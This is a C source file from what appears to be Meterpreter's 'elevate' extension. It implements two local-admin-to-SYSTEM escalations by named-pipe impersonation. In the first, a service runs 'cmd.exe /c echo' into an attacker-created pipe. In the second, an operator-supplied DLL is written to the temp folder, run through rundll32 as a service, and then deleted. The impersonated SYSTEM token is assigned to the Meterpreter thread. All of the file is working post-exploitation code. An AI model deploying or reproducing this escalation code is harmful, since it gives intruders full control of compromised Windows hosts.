#include "precomp.h"
#include "common_metapi.h"
#include "namedpipe.h"
#include "service.h"

/*
 * A post-impersonation callback that simply updates the meterpreter token to the
 * current thread token. This is used by the standard service-based technique.
 */
DWORD set_meterp_thread_use_current_token(Remote * remote)
{
	HANDLE hToken = NULL;

	// get a handle to this threads token
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
		dprintf("[ELEVATE] set_meterp_thread_use_current_token. OpenThreadToken failed");
		return GetLastError();
	}

	DWORD dwLevel, dwSize;
	if (!GetTokenInformation(hToken, TokenImpersonationLevel, &dwLevel, sizeof(dwLevel), &dwSize)) {
		dprintf("[ELEVATE] set_meterp_thread_use_current_token. GetTokenInformation failed");
		return GetLastError();
	}

	// check that the token can be used
	if ((dwLevel == SecurityAnonymous) || (dwLevel == SecurityIdentification)) {
		SetLastError(ERROR_BAD_IMPERSONATION_LEVEL);
		return ERROR_BAD_IMPERSONATION_LEVEL;
	}

	// now we can set the meterpreters thread token to that of our system
	// token so all subsequent meterpreter threads will use this token.
	met_api->thread.update_token(remote, hToken);
	return ERROR_SUCCESS;
}

/*
 * Worker thread for named pipe impersonation. Creates a named pipe and impersonates
 * the first client which connects to it.
 */
DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
{
	DWORD dwResult                               = ERROR_ACCESS_DENIED;
	HANDLE hPipe                                 = NULL;
	HANDLE hSem                                  = NULL;
	char * cpPipeName                            = NULL;
	BYTE bMessage[128]                           = {0};
	DWORD dwBytes                                = 0;
	BOOL bImpersonated                           = FALSE;
	PPRIV_POST_IMPERSONATION pPostImpersonation  = NULL;

	do {
		if (!thread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. invalid thread", ERROR_BAD_ARGUMENTS);
		}

		cpPipeName         = (char *)thread->parameter1;
		hSem               = (HANDLE)thread->parameter2;
		pPostImpersonation = (PPRIV_POST_IMPERSONATION)thread->parameter3;

		if (!cpPipeName) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread.  invalid thread arguments",
				ERROR_BAD_ARGUMENTS);
		}

		dprintf("[ELEVATE] pipethread. CreateNamedPipe(%s)", cpPipeName);

		// create the named pipe for the client service to connect to
		hPipe = CreateNamedPipe(cpPipeName,
			PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 1, 0, 0, 0, NULL);

		if (!hPipe) {
			BREAK_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. CreateNamedPipe failed");
		}

		while (TRUE) {
			if (met_api->event.poll(thread->sigterm, 0)) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. thread->sigterm received",
					ERROR_DBG_TERMINATE_THREAD);
			}

			// signal the client that the pipe is ready
            if (hSem) {
                if (!ReleaseSemaphore(hSem, 1, NULL)) {
					BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. ReleaseSemaphore failed",
						ERROR_DBG_TERMINATE_THREAD);
				}
			}

			// wait for a client to connect to our named pipe...
			if (!ConnectNamedPipe(hPipe, NULL)) {
				if (GetLastError() != ERROR_PIPE_CONNECTED)
					continue;
			}

			dprintf("[ELEVATE] elevate_namedpipe_thread. receieved a client connection");

			// we can't impersonate a client until we have performed a read on the pipe...
			if (!ReadFile(hPipe, &bMessage, 1, &dwBytes, NULL)) {
				DisconnectNamedPipe(hPipe);
				CONTINUE_ON_ERROR("[ELEVATE] pipethread. ReadFile failed");
			}

			// impersonate the client!
			bImpersonated = ImpersonateNamedPipeClient(hPipe);
			DisconnectNamedPipe(hPipe);
			if (!bImpersonated) {
				CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. ImpersonateNamedPipeClient failed");
			}

			if (pPostImpersonation) {
				dprintf("[ELEVATE] elevate_namedpipe_thread. dispatching to the post impersonation callback");
				dwResult = pPostImpersonation->pCallback(pPostImpersonation->pCallbackParam);
				if (dwResult != ERROR_SUCCESS) {
					RevertToSelf();
					BREAK_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. the post impersonation callback failed");
				}
			}
			else {
				dwResult = ERROR_SUCCESS;
			}
			break;
		}
	} while (0);

	if (hPipe) {
		CLOSE_HANDLE(hPipe);
	}

	dprintf("[ELEVATE] elevate_namedpipe_thread finishing, dwResult=%d", dwResult);
	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a cmd.exe under local
 * system which then connects to our named pipe and we impersonate this client. This can be done by an
 * Administrator without the need for SeDebugPrivilege.  Works on 2000, XP, 2003 and 2008 for all local
 * administrators. On Vista and 7 it will only work if the host process has been elevated through UAC
 * first. Does not work on NT4.
 */
DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
{
	DWORD dwResult                            = ERROR_SUCCESS;
	char * cpServiceName                      = NULL;
	THREAD * pThread                          = NULL;
	HANDLE hSem                               = NULL;
	char cServiceArgs[MAX_PATH]               = {0};
	char cServicePipe[MAX_PATH]               = {0};
	OSVERSIONINFO os                          = {0};
	PRIV_POST_IMPERSONATION PostImpersonation;

	do {
		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

		if (!GetVersionEx(&os)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: GetVersionEx failed")
		}

		// filter out Windows NT4
		if (os.dwMajorVersion == 4 && os.dwMinorVersion == 0) {
			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported.")
		}

		cpServiceName = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
		if (!cpServiceName) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. invalid arguments",
				ERROR_BAD_ARGUMENTS);
		}

		_snprintf_s(cServicePipe, sizeof(cServicePipe), MAX_PATH,
			"\\\\.\\pipe\\%s", cpServiceName);

		_snprintf_s(cServiceArgs, sizeof(cServiceArgs), MAX_PATH,
			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		PostImpersonation.pCallback = set_meterp_thread_use_current_token;
		PostImpersonation.pCallbackParam = remote;

		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.run failed",
				ERROR_ACCESS_DENIED);
		}

		// wait for the thread to create the pipe, if it times out terminate
        if (hSem) {
		    if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
			    BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
        } else {
            Sleep(500);
		}

		// start the elevator service (if it doesn't start first time we need to create it and then start it).
		if (service_start(cpServiceName) != ERROR_SUCCESS) {
			dprintf("[ELEVATE] service starting failed, attempting to create");
			if (service_create(cpServiceName, cServiceArgs) != ERROR_SUCCESS) {
				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe. service_create failed");
			}
			dprintf("[ELEVATE] creation of service succeeded, attempting to start");
			// we don't check a return value for service_start as we expect it to fail as cmd.exe is not
			// a valid service and it will never signal to the service manager that is is a running service.
			service_start(cpServiceName);
		}

		// signal our thread to terminate if it is still running
		met_api->thread.sigterm(pThread);

		// and wait for it to terminate...
		met_api->thread.join(pThread);

		// get the exit code for our pthread
		dprintf("[ELEVATE] dwResult before exit code: %u", dwResult);
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}
		dprintf("[ELEVATE] dwResult after exit code: %u", dwResult);

	} while (0);

	if (cpServiceName) {
		service_stop(cpServiceName);
		service_destroy(cpServiceName);
	}

	if (pThread) {
		met_api->thread.destroy(pThread);
	}
	if (hSem) {
		CloseHandle(hSem);
	}

	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a service under local
 * system which then connects to our named pipe and we impersonate this client. This can be done by an
 * Administrator without the need for SeDebugPrivilege, however a dll (elevator.dll) must be written to
 * disk. Works on NT4, 2000, XP, 2003 and 2008 for all local administrators. On Vista and 7 it will only
 * work if the host process has been elevated through UAC first.
 */
DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
{
	DWORD dwResult                            = ERROR_SUCCESS;
	THREAD * pThread                          = NULL;
	HANDLE hServiceFile                       = NULL;
	HANDLE hSem                               = NULL;
	LPVOID lpServiceBuffer                    = NULL;
	char * cpServiceName                      = NULL;
	THREAD * pthread                          = NULL;
	char cServicePath[MAX_PATH]               = {0};
	char cServiceArgs[MAX_PATH]               = {0};
	char cServicePipe[MAX_PATH]               = {0};
	char cTempPath[MAX_PATH]                  = {0};
	DWORD dwBytes                             = 0;
	DWORD dwTotal                             = 0;
	DWORD dwServiceLength                     = 0;
	PRIV_POST_IMPERSONATION PostImpersonation;

	do
	{
		cpServiceName   = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
		dwServiceLength = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH);
		lpServiceBuffer = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_DLL);

		if (!cpServiceName || !dwServiceLength || !lpServiceBuffer) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. invalid arguments",
				ERROR_BAD_ARGUMENTS);
		}

		if (GetTempPath(MAX_PATH, (LPSTR)&cTempPath) == 0) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. GetTempPath failed");
		}

		if (cTempPath[ strlen(cTempPath) - 1 ] == '\\') {
			_snprintf_s(cServicePath, sizeof(cServicePath), MAX_PATH, "%s%s.dll", cTempPath, cpServiceName);
		} else {
			_snprintf_s(cServicePath, sizeof(cServicePath), MAX_PATH, "%s\\%s.dll", cTempPath, cpServiceName);
		}

		_snprintf_s(cServiceArgs, sizeof(cServiceArgs), MAX_PATH, "rundll32.exe %s,a /p:%s", cServicePath, cpServiceName);

		_snprintf_s(cServicePipe, sizeof(cServicePipe), MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName);

		// write service dll to temp path...
		hServiceFile = CreateFile(cServicePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!hServiceFile) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. CreateFile hServiceFile failed");
		}

		while (dwTotal < dwServiceLength) {
			if (!WriteFile(hServiceFile,
				(LPCVOID)((LPBYTE)lpServiceBuffer + dwTotal),
				(dwServiceLength - dwTotal), &dwBytes, NULL)) {
				break;
			}
			dwTotal += dwBytes;
		}

		CLOSE_HANDLE(hServiceFile);

		if (dwTotal != dwServiceLength) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. WriteFile hServiceFile failed",
				ERROR_BAD_LENGTH);
		}

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		PostImpersonation.pCallback = set_meterp_thread_use_current_token;
		PostImpersonation.pCallbackParam = remote;

		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
				ERROR_ACCESS_DENIED);
		}

		//wait for the thread to create the pipe(if it times out terminate)
        if (hSem) {
			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
        } else {
                Sleep(500);
		}

		// start the elevator service (if it doesnt start first time we need to create it and then start it).
		if (service_start(cpServiceName) != ERROR_SUCCESS) {
			if (service_create(cpServiceName, cServiceArgs) != ERROR_SUCCESS) {
				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. service_create failed");
			}

			if (service_start(cpServiceName) != ERROR_SUCCESS) {
				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. service_start failed");
			}
		}

		WaitForSingleObject(pThread->handle, 10000);

		met_api->thread.sigterm(pThread);

		met_api->thread.join(pThread);

		// get the exit code for our pthread
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}

	} while (0);

	if (cpServiceName) {
		service_stop(cpServiceName);
		service_destroy(cpServiceName);
	}

	if (strlen(cServicePath) > 0) {
		DWORD dwIndex = 20;
		while (dwIndex--) {
			if (DeleteFile(cServicePath)) {
				break;
			}
			Sleep(500);
		}
	}

	if (pThread) {
		met_api->thread.destroy(pThread);
	}

	if (hSem) {
		CloseHandle(hSem);
	}

	return dwResult;
}

BOOL does_pipe_exist(LPWSTR pPipeName)
{
	HANDLE hPipe;
	if ((hPipe = CreateFileW(pPipeName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hPipe);
	return TRUE;
}
